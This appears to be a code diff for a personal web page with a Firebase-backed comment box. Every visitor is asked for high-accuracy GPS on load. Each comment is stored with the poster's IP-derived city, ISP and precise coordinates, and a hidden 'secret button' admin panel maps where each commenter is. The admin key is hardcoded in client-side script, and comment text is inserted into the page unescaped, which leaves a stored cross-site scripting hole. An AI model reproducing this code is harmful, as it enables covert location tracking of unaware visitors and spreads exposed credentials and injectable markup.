@@ -63,11 +63,11 @@ textarea{
 footer{margin-top:30px;font-size:.9rem;opacity:.6;text-align:center}
 small{opacity:.7}
 
-/* 🔐 Admin popup */
+/* ADMIN PANEL */
 #adminPanel{
   position:fixed;
   inset:0;
-  background:rgba(0,0,0,.8);
+  background:rgba(0,0,0,.85);
   display:none;
   justify-content:center;
   align-items:center;
@@ -75,16 +75,20 @@ small{opacity:.7}
 }
 #adminBox{
   background:#111;
-  width:90%;
-  max-width:700px;
-  max-height:80vh;
+  width:95%;
+  max-width:800px;
+  max-height:85vh;
   overflow-y:auto;
   border-radius:16px;
   padding:20px;
 }
-iframe{width:100%;height:250px;border-radius:12px;border:none;margin-top:10px}
-
-/* 🕵️ secret button */
+iframe{
+  width:100%;
+  height:240px;
+  border-radius:12px;
+  border:none;
+  margin-top:10px;
+}
 #secretBtn{
   font-size:10px;
   opacity:.2;
@@ -128,10 +132,10 @@ iframe{width:100%;height:250px;border-radius:12px;border:none;margin-top:10px}
 <footer>© 2026 Akshat Pandey • Hosted on my infrastructure</footer>
 </div>
 
-<!-- 🔐 ADMIN PANEL -->
+<!-- ADMIN PANEL -->
 <div id="adminPanel">
   <div id="adminBox">
-    <h3>Admin Location Panel</h3>
+    <h3>📍 Admin Location Panel</h3>
     <div id="adminContent"></div>
     <button class="comment-btn" onclick="closeAdmin()">Close</button>
   </div>
@@ -142,7 +146,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebas
 import {
   getFirestore, collection, addDoc,
   query, orderBy, onSnapshot,
-  serverTimestamp, deleteDoc, doc
+  serverTimestamp
 } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";
 
 const ADMIN_KEY = "@Akshat130807";
@@ -158,30 +162,22 @@ const db = getFirestore(app);
 
 let gps = null;
 
-/* 📍 AUTO ASK GPS ON LOAD */
-window.onload = () => {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => gps = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        acc: pos.coords.accuracy
-      },
-      () => gps = null,
-      { enableHighAccuracy: true }
-    );
-  }
-};
+// AUTO GPS REQUEST
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => gps = {
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      acc: pos.coords.accuracy
+    },
+    () => gps = null,
+    { enableHighAccuracy: true }
+  );
+}
 
 async function getIP(){
   const r = await fetch("https://ipapi.co/json/");
   return r.json();
-}
-
-function flag(code){
-  return code.toUpperCase().replace(/./g,c =>
-    String.fromCodePoint(127397 + c.charCodeAt())
-  );
 }
 
 window.addComment = async () => {
@@ -196,7 +192,6 @@ window.addComment = async () => {
     city:ip.city,
     region:ip.region,
     country:ip.country,
-    flag:flag(ip.country),
     timezone:ip.timezone,
     org:ip.org,
     gps:gps,
@@ -207,50 +202,47 @@ window.addComment = async () => {
 };
 
 const q = query(collection(db,"comments"), orderBy("time","desc"));
-onSnapshot(q,snap=>{
+
+onSnapshot(q, snap => {
   comments.innerHTML="";
-  snap.forEach(d=>{
+  adminContent.innerHTML="";
+
+  snap.forEach(d => {
     const c=d.data();
     const t=c.time?new Date(c.time.seconds*1000).toLocaleString():"";
+
     comments.innerHTML+=`
-    <div class="comment">
-      <span class="del" onclick="delComment('${d.id}')">✖</span>
-      <b>${c.flag} ${c.city}</b><br>
-      <small>${t}</small><br>
-      ${c.msg}
-    </div>`;
+      <div class="comment">
+        <b>${c.city || "Unknown"}</b><br>
+        <small>${t}</small><br>
+        ${c.msg}
+      </div>
+    `;
+
+    if(c.gps){
+      adminContent.innerHTML+=`
+        <div class="comment">
+          <b>${c.city || "Unknown"} (${c.country})</b><br>
+          GPS: ${c.gps.lat}, ${c.gps.lon} (±${Math.round(c.gps.acc)}m)
+          <iframe
+            src="https://www.openstreetmap.org/export/embed.html?bbox=${c.gps.lon-0.01},${c.gps.lat-0.01},${c.gps.lon+0.01},${c.gps.lat+0.01}&marker=${c.gps.lat},${c.gps.lon}">
+          </iframe>
+        </div>
+      `;
+    }
   });
 });
 
-/* ❌ delete */
-window.delComment=async(id)=>{
-  const k=prompt("Admin key:");
-  if(k!==ADMIN_KEY) return;
-  await deleteDoc(doc(db,"comments",id));
-};
-
-/* 🔐 admin panel */
-window.openAdmin=()=>{
-  const k=prompt("Admin key:");
-  if(k!==ADMIN_KEY) return;
+window.openAdmin = () => {
+  const k = prompt("Admin key:");
+  if(k !== ADMIN_KEY) return;
   adminPanel.style.display="flex";
 };
 
-window.closeAdmin=()=>adminPanel.style.display="none";
-
-onSnapshot(q,snap=>{
-  adminContent.innerHTML="";
-  snap.forEach(d=>{
-    const c=d.data();
-    if(!c.gps) return;
-    adminContent.innerHTML+=`
-    <div class="comment">
-      <b>${c.city}</b><br>
-      GPS: ${c.gps.lat}, ${c.gps.lon} (±${Math.round(c.gps.acc)}m)
-      <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${c.gps.lon-0.01},${c.gps.lat-0.01},${c.gps.lon+0.01},${c.gps.lat+0.01}&marker=${c.gps.lat},${c.gps.lon}"></iframe>
-    </div>`;
-  });
-});
+window.closeAdmin = () => {
+  adminPanel.style.display="none";
+};
 </script>
+
 </body>
 </html>
